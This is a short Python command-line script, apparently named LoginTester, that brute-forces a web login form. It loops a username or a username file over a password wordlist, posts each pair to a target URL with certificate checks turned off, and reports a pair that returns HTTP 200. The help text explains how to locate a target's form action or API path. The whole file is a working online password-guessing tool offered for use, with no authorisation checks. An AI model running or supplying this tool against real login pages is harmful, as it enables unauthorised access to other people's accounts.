#!/usr/bin/env python
import sys
import requests
from urllib3.exceptions import InsecureRequestWarning
import urllib3
from sty import fg, bg

# to bypass the security verification of http headers when sending request to http URLs
urllib3.disable_warnings(InsecureRequestWarning)


def SendRequestsWithOneUser():
    user_name = sys.argv[2]
    password_file = sys.argv[3]
    host = sys.argv[4]

    with open(password_file) as f:
        passwords_data = f.readlines()

    for ps in passwords_data:
        payload = {'username': user_name, 'password': ps.replace("\n", "")}
        response = requests.post(host, data=payload, verify=False)
        if(response.status_code == 200):
            print(fg.li_green + "[TEST PASSED]" + fg.rs, payload)
            exit(0)

    print(fg(255, 10, 10) + "Sorry no payload matched!!" + fg.rs)


def SendRequestWithMultipleUsers():
    username_file = sys.argv[2]
    password_file = sys.argv[3]
    host = sys.argv[4]

    with open(username_file) as f:
        username_data = f.readlines()
    with open(password_file) as f:
        password_data = f.readlines()

    for user in username_data:
        for ps in password_data:
            payload = {'username': user.replace(
                "\n", ""), 'password': ps.replace("\n", "")}
            print(bg.blue + "[TESTING]" + bg.rs, payload)
            response = requests.post(host, data=payload, verify=False)
            if(response.status_code == 200):
                print(fg.li_green + "[TEST PASSED]" + fg.rs, payload)
                exit(1)

    print(fg(255, 10, 10) + "Sorry no payload matched!!" + fg.rs)


def help():
    print('''
SCRIPT HELP
-----------

!!PLEASE INSTALL REQUIREMENTS.TXT IF NOT INSTALLED!!

!!MAKE SURE THE TXT FILES EXISTS!!


* Format for one user
python3 LoginTester.py -one [username] [password_file_path] [Request Link]

* Format for multiple users
python3 LoginTester.py -mul [username_file_path] [password_file_path] [Request Link]


IMPORTANT!! (info regarding the host URL)
-----------------------------------------
Double check the url to which you are sending the requests like if your target is using PHP then check the form action (using using page source or browser extension).
In case of REST API request check the API path using inspect or with appropriate browser extension.
    ''')
    exit(1)


def main():
    try:
        arg_one = sys.argv[1]
        if(arg_one == "-one"):
            SendRequestsWithOneUser()
        elif(arg_one == "-mul"):
            SendRequestWithMultipleUsers()
        elif(arg_one == "help" or arg_one == "--help"):
            help()
    except:
        help()


if __name__ == '__main__':
    main()

# references : https://stackoverflow.com/questions/11892729/how-to-log-in-to-a-website-using-pythons-requests-module
# Thanks to : https://stackoverflow.com/users/2600522/david
# Author : Arun Jangra (https://www.github.com/Arun89-crypto)
